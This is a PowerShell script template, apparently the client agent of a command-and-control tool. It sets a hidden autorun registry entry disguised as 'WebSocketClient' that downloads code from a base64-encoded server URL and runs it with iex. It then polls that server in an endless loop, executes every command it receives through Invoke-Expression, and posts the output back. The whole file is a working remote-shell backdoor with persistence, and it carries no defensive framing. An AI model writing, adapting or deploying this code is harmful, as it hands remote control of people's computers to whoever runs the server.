$Url = {{URL}}    
$checkInterval = {{CHECK_INTERVAL}}
$persistenceenabled = {{PERSISTENCE}}
$clientIdFile = "$env:TEMP\client_id.txt"
$serverUrl = [Uri][Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Url))
$uri = [Uri]$serverUrl
$cleanUrl = "{0}://{1}" -f $uri.Scheme, $uri.Host

if ($persistenceenabled) {
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $regName = "WebSocketClient"
      
        # The exact launch command you normally use
        $command    = "powershell.exe -NoProfile -ExecutionPolicy Bypass -c -WindowStyle Hidden `"iex (iwr $cleanUrl/connect)`""

        # Check existing value
        $currentValue = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue |
                        Select-Object -ExpandProperty $regName -ErrorAction SilentlyContinue

        if (-not $currentValue -or $currentValue -ne $command) {
            Set-ItemProperty -Path $regPath -Name $regName -Value $command
            Write-Host "Persistence added via registry: $regName → $command"
        } else {
            Write-Host "Persistence already set."
        }
    } catch {
        Write-Warning "Failed to set persistence: $_"
    }
}



if (Test-Path $clientIdFile) {
    $clientId = Get-Content $clientIdFile
} else {
    $clientId = [guid]::NewGuid().Guid
    $clientId | Set-Content $clientIdFile
    Write-Host "Generated new Client ID: $clientId"
}

while ($true) {
    try {

        $body = @{ client_id = $clientId } | ConvertTo-Json
        $response = Invoke-RestMethod -Uri "$serverUrl/check" `
            -Method Post `
            -Body $body `
            -ContentType "application/json" `
            -TimeoutSec 40 `
            -ErrorAction Stop

    
        if ($response -and $response.request_id -and $response.command) {
            $requestId = $response.request_id
            $command = $response.command

            try {
                $output = Invoke-Expression $command 2>&1 | Out-String
            } catch {
                $output = "Error executing command: $_"
            }

  
            $responseBody = @{
                client_id  = $clientId
                request_id = $requestId
                response   = $output
            } | ConvertTo-Json

            $null = Invoke-RestMethod -Uri "$serverUrl/response" `
                -Method Post `
                -Body $responseBody `
                -ContentType "application/json" `
                -ErrorAction Stop
        }
    } catch {
        Write-Warning "Communication error: $_"
    }

    Start-Sleep -Milliseconds $checkInterval
}